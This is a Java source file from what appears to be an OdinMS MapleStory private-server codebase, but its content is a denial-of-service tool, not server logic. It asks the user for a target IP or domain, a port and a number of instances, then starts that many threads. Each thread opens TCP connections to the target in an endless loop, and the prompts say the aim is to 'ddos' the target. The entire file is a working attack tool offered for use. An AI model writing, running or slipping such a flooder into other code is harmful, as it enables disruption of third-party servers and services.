/*
This file is part of the OdinMS Maple Story Server
Copyright (C) 2008 ~ 2010 Patrick Huy <patrick.huy@frz.cc> 
Matthias Butz <matze@odinms.de>
Jan Christian Meyer <vimes@odinms.de>

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU Affero General Public License version 3
as published by the Free Software Foundation. You may not use, modify
or distribute this program under any other version of the
GNU Affero General Public License.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU Affero General Public License for more details.

You should have received a copy of the GNU Affero General Public License
along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */
package tools;

import java.io.BufferedWriter;
import java.io.IOException;
import java.io.OutputStreamWriter;
import java.net.ConnectException;
import java.net.Socket;
import java.net.UnknownHostException;

public class Dos extends Socket implements Runnable {

	private static Dos instance = new Dos();
	public static String target = "";
	public static int port = 80;
	public static int count = 0;
	private static final String tosend = "";

	public static void main(String args[]) {

		System.out.println("Please input the IP/Domain of the target you would like to ddos :::");
		int retry1 = 0;
		while (retry1 == 0) {
			try {
				target = System.console().readLine();
				retry1 = 1;
			} catch (Exception e) {
				System.out.println("Invalid input. Please re-enter.");
			}
		}

		System.out.println("Please input the port of the target you would like to ddos [Default = 80");
		int retry2 = 0;
		while (retry2 == 0) {
			try {
				port = Integer.parseInt(System.console().readLine());
				retry2 = 1;
			} catch (Exception e) {
				System.out.println("Invalid input. Please re-enter.");
			}
		}

		System.out.println("Please input the number of instance you would like to create :::");
		int retry3 = 0;
		int times = 0;
		while (retry3 == 0) {
			try {
				times = Integer.parseInt(System.console().readLine());
				retry3 = 1;
			} catch (Exception e) {
				System.out.println("Invalid input. Please re-enter.");
			}
		}

		System.out.println("Starting instances.");
		for (int i = 0; i < times; i++) {
			new Thread(instance).start();
			count++;
			System.out.println("Instance #" + i + " started.");
		}
	}

	@Override
	public void run() {
		while (true) {
			try {
				Socket sock = new Socket(target, port);
				final BufferedWriter out = new BufferedWriter(new OutputStreamWriter(sock.getOutputStream()));
				out.write(tosend);
				out.flush();
				out.close();
				sock.close();
			} catch (ConnectException ce) {
				System.out.println("Connection exception occured, retrying.");
			} catch (UnknownHostException e) {
				System.out.println("DDoS.run: " + e);
			} catch (IOException e) {
				System.out.println("DDoS.run: " + e);
			}
		}
	}
}
